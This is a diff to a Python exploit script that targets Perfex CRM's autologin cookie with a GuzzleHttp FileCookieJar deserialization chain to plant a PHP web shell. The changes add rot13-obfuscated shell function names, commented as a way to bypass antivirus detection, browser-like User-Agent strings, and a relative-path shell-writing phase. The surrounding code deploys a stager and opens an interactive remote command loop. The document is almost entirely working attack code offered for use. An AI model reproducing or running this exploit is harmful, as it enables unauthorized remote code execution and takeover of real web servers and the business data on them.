@@ -62,9 +62,10 @@ def build_rce_payload(target_path, php_code=None):
     """
     if php_code is None:
         # AV-evasion multi-function shell using str_rot13 to hide function names
-        # rot13: flfgrz=system, cnffgueh=passthru, rkrp=exec, furyy_rkrp=shell_exec, cbcra=popen
+        # rot13: flfgrz=system, cnffgueh=passthru, furyy_rkrp=shell_exec, cbcra=popen
+        # popen needs 2 args (cmd,'r') so handled separately with fread
         # No literal exec function names → bypasses AV signature detection
-        php_code = "<?php echo 'YR';$c=$_GET['cmd']??$_GET['c']??'id';$r='';foreach(array('flfgrz','cnffgueh','rkrp','furyy_rkrp','cbcra') as $x){$f=str_rot13($x);if(function_exists($f)){ob_start();$f($c);$r=ob_get_clean();if($r)break;}}echo $r;?>"
+        php_code = "<?php echo 'YR';$c=$_GET['cmd']??$_GET['c']??'id';$r='';foreach(array('flfgrz','cnffgueh','furyy_rkrp') as $x){$f=str_rot13($x);if(function_exists($f)){ob_start();$f($c);$r=ob_get_clean();if($r)break;}}if(!$r&&function_exists(str_rot13('cbcra'))){$r=fread(popen($c,'r'),999999);}if(!$r&&function_exists(str_rot13('rkrp'))){$f=str_rot13('rkrp');$f($c,$o);$r=join(chr(10),$o);}echo $r;?>"
     fcj_class = 'GuzzleHttp\\Cookie\\FileCookieJar'   # 31 chars
     sc_class = 'GuzzleHttp\\Cookie\\SetCookie'        # 27 chars
 
@@ -109,7 +110,7 @@ def send_cookie(target_url, cookie_value, timeout=10):
     """Send request with autologin cookie, return (status, body)."""
     cookie_encoded = urllib.parse.quote(cookie_value, safe='')
     req = urllib.request.Request(f'{target_url}/admin/authentication', headers={
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Cookie': f'autologin={cookie_encoded}',
     })
     try:
@@ -127,7 +128,7 @@ def check_shell(target_url, web_path, cmd='id'):
     url = f'{target_url}/{web_path}?cmd={urllib.parse.quote(cmd)}'
     try:
         r = urllib.request.urlopen(
-            urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'}),
+            urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}),
             timeout=8, context=ctx
         )
         body = r.read().decode(errors='replace')
@@ -217,6 +218,38 @@ def phase2_exploit(target_url, webroot):
         if found:
             print(f"    [+] SHELL WRITTEN AND ACCESSIBLE!")
             return web_path, output
+
+    return None, None
+
+
+# ==================== PHASE 2B: RELATIVE PATH ====================
+
+def phase2b_relative(target_url):
+    """
+    Write shell using RELATIVE path (no leading /).
+    PHP file_put_contents('temp/x.php') resolves relative to CWD.
+    In PHP-FPM, CWD = webroot in most configurations.
+    This bypasses the need to know the absolute filesystem path!
+    """
+    print()
+    print("[*] Phase 2B: Relative path write (CWD = webroot)")
+
+    shell_name = SHELL_NAME
+    sub_dirs = ['temp/', 'modules/', 'uploads/', '']
+
+    for sub in sub_dirs:
+        rel_path = sub + shell_name
+        print(f"    Trying relative: {rel_path}")
+
+        payload = build_rce_payload(rel_path)
+        status, body = send_cookie(target_url, payload)
+        time.sleep(0.5)
+
+        found, output = check_shell(target_url, rel_path)
+        if found:
+            print(f"    [+] SHELL WRITTEN VIA RELATIVE PATH!")
+            # Try to extract absolute path from __FILE__ for future use
+            return rel_path, output
 
     return None, None
 
@@ -335,7 +368,14 @@ def main():
             print_success(target_url, web_path, output, webroot)
             return
 
-    # Phase 3: Brute force common paths
+    # Phase 2B: Try relative path (works when CWD = webroot)
+    web_path, output = phase2b_relative(target_url)
+    if web_path:
+        # Relative path worked — webroot = CWD (unknown abs path, use relative)
+        print_success(target_url, web_path, output, '')
+        return
+
+    # Phase 3: Brute force common absolute paths
     web_path, output, found_webroot = phase3_brute(target_url, domain)
     if web_path:
         print_success(target_url, web_path, output, found_webroot)
@@ -347,6 +387,7 @@ def main():
         print("[-] Possible reasons:")
         print("    - display_errors=0 (no path leak)")
         print("    - Non-standard webroot (not in brute force list)")
+        print("    - Relative path CWD != webroot")
         print("    - GuzzleHttp not available (Perfex < 3.0)")
         print("    - temp/modules directories not writable")
         print("=" * 60)
@@ -377,7 +418,7 @@ def exec_cmd(target_url, shell_path, webroot, command):
 
     url = f'{target_url}/{shell_path}?cmd={urllib.parse.quote(command)}'
     try:
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
         r = urllib.request.urlopen(req, timeout=15, context=ctx)
         body = r.read().decode(errors='replace')
         return extract_output(body)
@@ -443,7 +484,7 @@ def deploy_stager(target_url, web_path, webroot):
         post_data = urllib.parse.urlencode({'d': shell_b64}).encode()
         stager_url = f'{target_url}/{web_path}'
         req = urllib.request.Request(stager_url, data=post_data, headers={
-            'User-Agent': 'Mozilla/5.0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded',
         })
         try:
@@ -462,7 +503,7 @@ def deploy_stager(target_url, web_path, webroot):
         time.sleep(0.5)
         try:
             url = f'{target_url}/{cmd_web}?cmd=id'
-            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
             r = urllib.request.urlopen(req, timeout=15, context=ctx)
             body = r.read().decode(errors='replace')
             if 'uid=' in body or 'gid=' in body:
@@ -520,7 +561,7 @@ def print_success(target_url, web_path, output, webroot):
                     if not cmd or cmd.lower() in ('exit', 'quit'):
                         break
                     url = f'{target_url}/{cmd83_path}?cmd={urllib.parse.quote(cmd)}'
-                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
                     r = urllib.request.urlopen(req, timeout=15, context=ctx)
                     result = r.read().decode(errors='replace')
                     print(result.strip() if result.strip() else '(no output)')
@@ -565,3 +606,4 @@ def print_success(target_url, web_path, output, webroot):
 
 if __name__ == '__main__':
     main()
+
